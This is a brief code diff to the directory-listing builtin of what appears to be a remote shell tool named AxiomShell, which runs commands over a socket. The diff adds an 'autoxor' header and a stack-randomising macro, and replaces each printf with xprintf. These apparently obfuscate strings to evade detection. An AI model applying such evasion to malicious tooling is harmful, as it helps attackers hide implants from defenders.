@@ -1,4 +1,5 @@
 #include "AxiomShell.h"
+#include "autoxor.h"
 #include "ls.h"
 #include "winnt.h"
 
@@ -12,16 +13,17 @@ unsigned int g_ls_hasfiles = 0;
 
 BOOL BUILTIN_ls(SOCKET sock, size_t argc, char **argv)
 {
+	STACK_RANDOMIZER;
 	SIZE_T options_cnt;
 	PLS_TARGET targets;
 
-	printf("[+] Running BUILTIN_LS\n");
+	xprintf("[+] Running BUILTIN_LS\n");
 	options_cnt = BUILTIN_LS_parse_options(argc, argv);
-	printf("[+] Parsed %lld arguments, g_flags=0x%x\n", options_cnt, g_ls_flags);
+	xprintf("[+] Parsed %lld arguments, g_flags=0x%x\n", options_cnt, g_ls_flags);
 	targets = BUILTIN_LS_prepare_targets(sock, argc, options_cnt, argv);
 	if (targets == NULL)
 	{
-		printf("[!] Unexpected error while preparing targets\n");
+		xprintf("[!] Unexpected error while preparing targets\n");
 		return (FALSE);
 	}
 
